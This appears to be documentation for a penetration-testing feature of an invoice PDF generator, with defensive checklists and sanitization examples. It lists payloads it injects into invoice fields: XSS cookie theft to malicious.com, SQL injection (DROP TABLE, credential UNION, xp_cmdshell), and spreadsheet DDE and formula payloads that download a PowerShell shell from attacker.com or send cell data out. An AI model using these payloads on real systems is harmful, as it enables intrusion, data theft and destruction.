# Pen Testing Mode - Dangerous Payload Injection

⚠️  **WARNING: FOR SECURITY TESTING ONLY**

This feature generates invoice PDFs with dangerous payloads injected into various fields for penetration testing and security validation.

## Purpose

The dangerous payload injection feature is designed to:
- Test input sanitization and validation in document processing systems
- Identify XSS (Cross-Site Scripting) vulnerabilities
- Test SQL injection defenses in database systems
- Validate CSV export security (formula injection prevention)
- Test HTML encoding/escaping mechanisms
- Validate security controls in document viewers and processors
- Ensure proper content security policies are enforced
- Test parameterized queries and ORM security

## Usage

### Enable Dangerous Payload Injection

```bash
python generate_invoices.py -n 50 --dangerous-html
```

Note: The `--dangerous-html` flag now enables all three types of injection (HTML, SQL, CSV).

### Programmatic Usage

```python
from generate_invoices import InvoiceGenerator

# Create generator with dangerous payload injection enabled
generator = InvoiceGenerator(
    output_dir="pen_test_invoices",
    inject_dangerous_html=True  # Enables HTML, SQL, and CSV injection
)

# Generate invoices with dangerous payloads
results = generator.generate_batch(count=100)
```

## File Naming Convention

Files generated with dangerous HTML injection are labeled with `_dangerous_` in the filename:

- Normal: `invoice_12345_1791003.pdf`
- Pen Testing: `invoice_dangerous_12345_script_alert_XSS_.pdf`

This makes it easy to identify and segregate pen testing files from normal test files.

## Injection Points

Dangerous payloads are randomly injected into the following invoice fields:

### High-Risk Fields (Higher Injection Probability)
- **Vendor Name** (20% probability) - HTML + SQL injection
- **Customer Name** (20% probability) - HTML + SQL injection
- **Product Descriptions** (15% probability per item) - HTML + SQL + CSV injection

### Medium-Risk Fields
- **Invoice Number** (15% probability) - SQL + CSV injection
- **PO Number** (10% probability) - SQL + CSV injection

### Low-Risk Fields
- **Address Components** (10% probability) - HTML + SQL injection
  - Street names
  - City names
- **Product Codes** (10% probability) - SQL + CSV injection

### Injection Type Selection
For each field, the generator intelligently chooses appropriate injection types:
- Display fields (names, addresses) → HTML + SQL
- Numeric/ID fields (invoice numbers, PO numbers) → SQL + CSV
- Mixed content fields (descriptions) → HTML + SQL + CSV

## Payload Types

The generator includes 100+ dangerous payloads across three attack categories:

---

## 1. HTML/XSS Injection (40+ Payloads)

### Script Tags
```html
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
<script>window.location='http://malicious.com'</script>
<script src='http://malicious.com/evil.js'></script>
```

### Event Handlers
```html
<img src=x onerror=alert('XSS')>
<img src=x onerror=alert(document.domain)>
<body onload=alert('XSS')>
<svg/onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
```

### Iframe Injections
```html
<iframe src='http://malicious.com'></iframe>
<iframe src='javascript:alert(1)'></iframe>
<iframe src='data:text/html,<script>alert(1)</script>'></iframe>
```

### HTML Injection
```html
<div style='position:absolute;top:0;left:0;width:100%;height:100%;background:red'>HACKED</div>
<marquee>SECURITY BREACH</marquee>
<h1 style='color:red'>INJECTED CONTENT</h1>
```

### Form Hijacking
```html
<form action='http://malicious.com'><input name='data'></form>
<button onclick='alert(1)'>Click Me</button>
```

### Data Exfiltration
```html
<img src='http://malicious.com/steal?data='+document.cookie>
<link rel='stylesheet' href='http://malicious.com/steal.css'>
```

### Encoded Payloads
```html
&#60;script&#62;alert('XSS')&#60;/script&#62;
&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;
```

### Case Evasion
```html
<ScRiPt>alert('XSS')</ScRiPt>
<IMG SRC=javascript:alert('XSS')>
```

### CSS Injection
```html
<style>body{background:url('http://malicious.com/steal?data='+document.cookie)}</style>
<style>@import'http://malicious.com/evil.css';</style>
```

### Template Injection Attempts
```html
{{7*7}}
${7*7}
<%= 7*7 %>
```

### Meta Tag Attacks
```html
<meta http-equiv='refresh' content='0;url=http://malicious.com'>
<base href='http://malicious.com/'>
```

---

## 2. SQL Injection (35+ Payloads)

### Basic SQL Injection
```sql
' OR '1'='1
' OR 1=1--
' OR 'a'='a
admin' --
admin' #
admin'/*
```

### UNION-based Injection
```sql
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT username, password FROM users--
' UNION ALL SELECT NULL, NULL, NULL--
```

### Stacked Queries (Critical)
```sql
'; DROP TABLE users--
'; DROP DATABASE invoices--
'; DELETE FROM invoices WHERE 1=1--
'; UPDATE users SET password='hacked'--
'; INSERT INTO admins VALUES ('hacker', 'password')--
```

### Time-based Blind SQL Injection
```sql
'; WAITFOR DELAY '00:00:05'--
'; SELECT SLEEP(5)--
' AND SLEEP(5)--
1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
```

### Boolean-based Blind SQL Injection
```sql
' AND 1=1--
' AND 1=2--
' AND EXISTS(SELECT * FROM users)--
' AND (SELECT COUNT(*) FROM users) > 0--
```

### Error-based SQL Injection
```sql
' AND 1=CONVERT(int, (SELECT @@version))--
' AND 1=CAST((SELECT @@version) AS int)--
' AND extractvalue(1, concat(0x7e, (SELECT @@version)))--
```

### Authentication Bypass
```sql
admin' OR '1'='1' --
' OR '1'='1' --
') OR ('1'='1' --
1' OR '1' = '1' --
```

### Command Injection via SQL
```sql
'; exec xp_cmdshell('dir')--
'; EXEC sp_executesql N'SELECT * FROM users'--
'; exec master..xp_cmdshell 'ping attacker.com'--
```

### NoSQL Injection
```javascript
' || '1'=='1
' && '1'=='1
{$ne: null}
{$gt: ''}
```

---

## 3. CSV Formula Injection (30+ Payloads)

### Excel Formula Injection
```excel
=1+1
=1+2+3+4
=SUM(A1:A10)
=A1+A2
=10+20
```

### Command Execution (Critical)
```excel
=cmd|'/c calc'!A1
=cmd|'/c powershell IEX(wget attacker.com/shell.ps1)'!A1
=system('calc')
=cmd|'/c powershell -Command "Start-Process calc"'!A1
```

### DDE (Dynamic Data Exchange) Injection
```excel
=cmd|'/c notepad'!A1
@SUM(1+1)*cmd|'/c calc'!A1
+cmd|'/c calc'!A1
-cmd|'/c calc'!A1
```

### Hyperlink Injection
```excel
=HYPERLINK("http://malicious.com", "Click me")
=HYPERLINK("http://attacker.com/steal?data="&A1, "Invoice")
```

### Data Exfiltration
```excel
=IMPORTXML(CONCAT("http://attacker.com/?",A1:A100), "//a")
=WEBSERVICE("http://attacker.com/collect?data="&A1)
=IMAGE("http://attacker.com/track.png?data="&A1)
```

### Multiple Formula Prefixes
```excel
@SUM(1+1)
+SUM(1+1)
-SUM(1+1)
```

### Nested Formulas
```excel
=1+1+SUM(A1:A100)
=IF(A1>0, "YES", "NO")
=CONCATENATE(A1, " ", A2)
=IF(A1>0, cmd|'/c calc'!A1, "Safe")
=IFERROR(1/0, cmd|'/c notepad'!A1)
```

### Google Sheets Specific
```excel
=IMPORTRANGE("https://docs.google.com/spreadsheets/d/[ID]", "Sheet1!A1:A10")
```

### LibreOffice Calc Specific
```excel
=DDE("calc", "file:///etc/passwd", "Sheet1")
```

### File System Access
```excel
=cmd|'/c type C:\Windows\System32\drivers\etc\hosts'!A1
```

---

## Injection Strategies

The generator uses three injection strategies for all payload types:

1. **Append**: Payload is appended to the original text
   ```
   "Contoso, Ltd. <script>alert('XSS')</script>"
   "7305282 ' OR '1'='1"
   "Adapter =SUM(A1:A10)"
   ```

2. **Prepend**: Payload is prepended to the original text
   ```
   "<script>alert('XSS')</script> Contoso, Ltd."
   "'; DROP TABLE users-- 7305282"
   "=cmd|'/c calc'!A1 Adapter"
   ```

3. **Replace**: Original text is completely replaced with payload
   ```
   "<script>alert('XSS')</script>"
   "' UNION SELECT username, password FROM users--"
   "=HYPERLINK(\"http://malicious.com\", \"Click me\")"
   ```

## Testing Checklist

When using these files for pen testing, verify that your system:

### HTML/XSS Protection
- [ ] Properly HTML-encodes all user-supplied content
- [ ] Sanitizes HTML tags before rendering
- [ ] Implements Content Security Policy (CSP)
- [ ] Does not execute JavaScript from document content
- [ ] Properly escapes special characters
- [ ] Handles encoded payloads correctly
- [ ] Prevents inline event handlers
- [ ] Blocks form submission to external domains

### SQL Injection Protection
- [ ] Uses parameterized queries or prepared statements
- [ ] Implements proper input validation
- [ ] Uses ORM security features correctly
- [ ] Applies least privilege database permissions
- [ ] Logs suspicious query patterns
- [ ] Implements query timeout limits
- [ ] Escapes special SQL characters
- [ ] Validates data types before queries
- [ ] Uses stored procedures with proper permissions

### CSV Formula Injection Protection
- [ ] Prefixes formula characters (=, +, -, @) with single quote
- [ ] Validates cell content before CSV export
- [ ] Warns users about potentially dangerous formulas
- [ ] Strips formula prefixes from exported data
- [ ] Implements CSV sanitization library
- [ ] Tests with Excel, Google Sheets, LibreOffice
- [ ] Validates hyperlinks in exported data
- [ ] Prevents DDE execution in exports

### General Security
- [ ] Validates and rejects malicious input at ingestion
- [ ] Logs security events for suspicious payloads
- [ ] Implements rate limiting for suspicious patterns
- [ ] Monitors for attack patterns
- [ ] Implements proper error handling (no information disclosure)

## Expected Behavior

### HTML/XSS - Properly Secured System Should:
1. **Encode/Escape**: All HTML special characters should be encoded
   - `<` becomes `&lt;`
   - `>` becomes `&gt;`
   - `"` becomes `&quot;`
   - `'` becomes `&#39;`

2. **Sanitize**: Remove or neutralize dangerous HTML tags and attributes

3. **CSP**: Implement Content Security Policy headers

### SQL Injection - Properly Secured System Should:
1. **Parameterize**: Use parameterized queries exclusively
   ```python
   # Good
   cursor.execute("SELECT * FROM invoices WHERE id = ?", (invoice_id,))
   
   # Bad
   cursor.execute(f"SELECT * FROM invoices WHERE id = {invoice_id}")
   ```

2. **Validate**: Type check and validate all inputs

3. **Limit**: Use least privilege database accounts

### CSV Formula Injection - Properly Secured System Should:
1. **Sanitize**: Prefix formula characters with single quote
   ```python
   # Good
   if cell.startswith(('=', '+', '-', '@')):
       cell = "'" + cell
   ```

2. **Warn**: Display warnings about potentially dangerous content

3. **Validate**: Check for command execution patterns

## Security Warnings

⚠️  **IMPORTANT WARNINGS**:

1. **Never use in production**: These files are for testing only
2. **Controlled environment**: Only test in isolated, secure environments
3. **No real data**: Do not mix pen testing files with real invoices
4. **Proper disposal**: Delete pen testing files after use
5. **Access control**: Restrict access to dangerous HTML files
6. **Documentation**: Document all pen testing activities

## Reporting Issues

If pen testing reveals vulnerabilities:

1. Document the vulnerability with specific payload details
2. Note the injection point (field name) and context
3. Record the system's response (executed, displayed, logged)
4. Assess the severity and potential impact
5. Create a detailed security report with reproduction steps
6. Do not exploit the vulnerability beyond initial discovery

## Compliance Notes

Using dangerous payload injection (HTML, SQL, CSV) for testing purposes is legitimate when:
- Testing is authorized and documented
- Testing occurs in controlled environments
- Results are used to improve security
- No production data is compromised
- Testing follows responsible disclosure practices
- Testing is performed by qualified security professionals
- All testing activities are logged and reviewed

## Example Test Cases

### Test Case 1: HTML/XSS Injection
```python
generator = InvoiceGenerator(
    output_dir="xss_test",
    inject_dangerous_html=True
)

results = generator.generate_batch(count=10)

for result in results:
    pdf_path = result['pdf_path']
    json_path = result['json_path']
    
    # Test 1: Upload PDF and verify HTML is not executed
    # Test 2: Extract data and verify proper HTML encoding
    # Test 3: Check browser console for XSS execution
    # Test 4: Verify CSP headers prevent script execution
```

### Test Case 2: SQL Injection
```python
generator = InvoiceGenerator(
    output_dir="sql_test",
    inject_dangerous_html=True
)

results = generator.generate_batch(count=10)

for result in results:
    invoice_data = result['invoice_data']
    
    # Test 1: Insert invoice into database using extracted data
    # Test 2: Verify parameterized queries prevent injection
    # Test 3: Check database logs for suspicious queries
    # Test 4: Verify error messages don't leak database info
    # Test 5: Test with invoice numbers like "'; DROP TABLE users--"
```

### Test Case 3: CSV Formula Injection
```python
generator = InvoiceGenerator(
    output_dir="csv_test",
    inject_dangerous_html=True
)

results = generator.generate_batch(count=10)

for result in results:
    # Export invoice data to CSV
    csv_data = export_to_csv(result['invoice_data'])
    
    # Test 1: Open CSV in Excel and verify formulas don't execute
    # Test 2: Check if formula characters are properly escaped
    # Test 3: Verify DDE attacks are prevented
    # Test 4: Test with Google Sheets and LibreOffice
```

## Vulnerability Examples

### Example 1: XSS via Invoice Number
**Payload**: `<script>alert(document.cookie)</script>`  
**Location**: Invoice Number field  
**Risk**: High - Could steal session cookies if displayed in web UI

### Example 2: SQL Injection via Vendor Name
**Payload**: `'; DROP TABLE invoices--`  
**Location**: Vendor Name field  
**Risk**: Critical - Could delete entire database table

### Example 3: CSV Formula Injection via Product Description
**Payload**: `=cmd|'/c calc'!A1`  
**Location**: Product Description field  
**Risk**: Critical - Could execute arbitrary commands when CSV is opened

### Example 4: UNION-based SQL Injection
**Payload**: `' UNION SELECT username, password FROM users--`  
**Location**: Customer Name field  
**Risk**: Critical - Could extract sensitive user data

### Example 5: Time-based Blind SQL Injection
**Payload**: `'; SELECT SLEEP(5)--`  
**Location**: PO Number field  
**Risk**: Medium - Could be used to map database structure

## Additional Resources

### HTML/XSS
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)
- [Content Security Policy Guide](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

### SQL Injection
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [OWASP Query Parameterization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html)

### CSV Formula Injection
- [OWASP CSV Injection](https://owasp.org/www-community/attacks/CSV_Injection)
- [CSV Injection Prevention](https://www.contextis.com/en/blog/comma-separated-vulnerabilities)
